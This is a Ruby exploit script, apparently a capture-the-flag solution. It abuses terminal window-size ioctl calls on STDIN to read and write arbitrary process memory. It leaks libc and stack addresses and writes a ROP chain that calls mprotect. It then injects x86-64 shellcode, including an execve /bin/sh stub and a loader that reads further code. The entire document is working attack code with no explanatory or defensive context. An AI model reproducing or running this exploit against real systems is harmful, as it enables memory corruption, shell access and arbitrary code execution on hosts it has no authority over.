GC.disable
@s = 'A' * 8
tt = [/a/, "meow", 1234, {a: 2}] * 100
@s = 'A' * 8
leak = lambda do |addr|
  return 0 if addr.to_s(16).chars.count{|c|c=='0'} > 6
  @s = 'A' * 8
  begin
    STDIN.ioctl(0x5414, addr)
  rescue
    return 0
  end
  STDIN.ioctl(0x5413, @s)
  @s[0, 8].unpack("Q*")[0]
end

p @s
p (@s.__id__*2).to_s(16)
a = {a:1}
p (a.__id__*2).to_s(16)
STDIN.ioctl(0x5413, @s)
res = ''
p @s
100000.step do |i|
  STDIN.ioctl(0x5414, a.__id__*2 + 8*i)
  STDIN.ioctl(0x5413, @s)
  res = @s[0,8].unpack("Q*")[0]
  (p [i, res.to_s(16)];break) if res & -4096 == res && res.to_s(16).size == 12 && res.to_s(16).start_with?('7') && [leak.call(res)].pack("Q*").start_with?("\x7fELF")
end

write = lambda do |addr, val|
  STDIN.ioctl(0x5414, [val].pack("Q*"))
  STDIN.ioctl(0x5413, addr)
end
libc = res + 0xde6000
stack = leak.call(libc + 0x3c62f8) - 272
p 'stack: 0x' + stack.to_s(16)
mprotect = libc + 0x102ca0
pop_rdi = libc + 0x000000000001fd7a
pop_rdx_rsi = libc + 0x0000000000116d69
buf = libc + 0x3c1000
rop = [pop_rdi, buf, pop_rdx_rsi, 7, 0x2000, mprotect, buf]
rop.each_with_index do |v, i|
  write.call(stack + i * 8, v)
end

sc = "jhH\xB8/bin///sPj;XH\x89\xE71\xF6\x99\x0F\x05"
sc = "j\tX\xBF\x01\x01\x01\x01\x81\xF7\x011\f\r\xBE\x01\x01\x01\x01\x81\xF6\x01\x11\x01\x01j\aZj2AZj\xFFAXE1\xC9\x0F\x051\xC01\xFF\xBE\x01\x01\x01\x01\x81\xF6\x011\f\r1\xD2\xB6\b\x0F\x05\xB8\x01\x01\x01\x015\x011\f\r\xFF\xD0"
sc = sc.rjust((sc.size / 8 + 1) * 8, "\x90")
sc.scan(/.{8}/m).each_with_index do |v, i|
  write.call(buf + i * 8, v.unpack("Q*")[0])
end
exit
